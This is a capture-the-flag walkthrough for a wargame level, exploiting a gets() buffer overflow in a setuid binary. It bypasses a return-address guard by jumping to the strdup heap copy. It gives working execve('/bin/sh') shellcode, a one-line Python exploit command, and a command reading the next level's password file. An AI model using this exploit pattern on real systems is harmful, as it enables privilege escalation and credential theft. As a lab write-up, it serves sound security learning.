# Level2 Walkthrough

Binary is setuid `level3`. `main` only calls `p`:

```c
void p(void) {
  char buffer[76];
  void *ret;

  fflush(stdout);
  gets(buffer);
  ret = __builtin_return_address(0);
  if (((unsigned int)ret & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", ret);
    _exit(1);
  }
  puts(buffer);
  strdup(buffer);
}
```

## Vulnerability

`gets(buffer)` has no bounds check -> buffer overflow, the saved return address of
`p` can be overwritten. A guard blocks any return address starting with `0xb`
(stack / libc / ld.so), so returning into the stack is impossible.

But `strdup(buffer)` copies the input to the heap at a fixed `0x08...` address,
which passes the guard and is executable.

## Exploitation

Buffer overflow: shellcode + padding + saved ebp + return address, where the
return address points to the heap copy made by `strdup`.

```sh
(python -c 's="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; print s + "A"*(80-len(s)) + "\x08\xa0\x04\x08"'; cat) | ./level2
```

- shellcode: `execve("/bin/sh")`, placed at the start so `strdup` copies it to the heap.
- `"A"*(80-len(s))`: padding = offset 80 minus shellcode size, to reach the return address (buffer 76 + ebp 4).
- `\x08\xa0\x04\x08`: heap address `0x804a008` (from `strdup`) in little-endian, overwrites the return address.
- `; cat`: keeps stdin open so the shell stays usable.

```sh
whoami            # level3
cat /home/user/level3/.pass
```

